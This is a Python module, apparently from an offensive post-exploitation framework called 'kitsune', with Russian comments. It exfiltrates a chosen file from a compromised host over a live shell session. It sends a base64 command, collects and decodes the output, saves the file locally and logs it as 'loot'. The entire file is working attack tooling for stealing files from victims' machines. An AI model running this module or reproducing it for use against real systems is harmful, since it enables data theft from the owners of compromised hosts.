"""post/exfil — выкачать файл через живую сессию (cat -> base64 -> восстановление)."""

import base64
import os

from kitsune import db
from kitsune.framework import Module


class Module(Module):
    meta = {
        "name": "post/exfil",
        "author": "kitsune",
        "description": "Exfiltrate a file over a live shell session (base64 transport)",
        "options": {
            "session": {"default": "", "required": False, "desc": "session index (default: last)"},
            "path":    {"default": "", "required": True, "desc": "remote file path"},
            "out":     {"default": "", "required": False, "desc": "local output file (default auto)"},
        },
    }

    def run(self):
        sessions = self.fw.sessions
        if not sessions:
            self.fail("no live sessions")
            return
        try:
            idx = int(self.session) if self.session else len(sessions) - 1
            sess = sessions[idx]
        except (IndexError, ValueError):
            self.fail(f"session index 0..{len(sessions)-1}")
            return

        path = self.path.strip()
        if not path:
            self.fail("set path first")
            return

        conn = sess["conn"]
        self.status(f"exfil {path} from {sess['host']} (base64 transport)")

        # request
        try:
            conn.sendall(f"base64 {path} 2>/dev/null\n".encode())
        except OSError as e:
            self.fail(f"session dead: {e}")
            return

        # read until timeout (wlнесколько чанков)
        conn.settimeout(2.5)
        buf = b""
        import socket as _socket
        try:
            while True:
                chunk = conn.recv(65536)
                if not chunk:
                    break
                buf += chunk
        except _socket.timeout:
            pass
        except OSError as e:
            self.fail(f"connection lost: {e}")
            return

        # parse base64 lines
        b64 = "".join(
            l.strip() for l in buf.decode("utf-8", errors="replace").splitlines()
            if l.strip() and not l.strip().lower().startswith("kitsune")
        )
        b64 = "".join(ch for ch in b64 if ch.isalnum() or ch in "+/=")
        if not b64:
            self.fail("nothing received (check path / perms / base64 availability)")
            return

        try:
            data = base64.b64decode(b64, validate=False)
        except Exception as e:  # noqa: BLE001
            self.fail(f"can't decode base64: {e}")
            return

        out_path = self.out.strip() or f"kitsune_exfil_{os.path.basename(path) or 'data'}"
        with open(out_path, "wb") as f:
            f.write(data)

        db.add_loot("exfil", sess["host"], f"{path} -> {out_path} ({len(data)} bytes)")
        self.ok(f"exfiltrated {len(data)} bytes -> {out_path}")
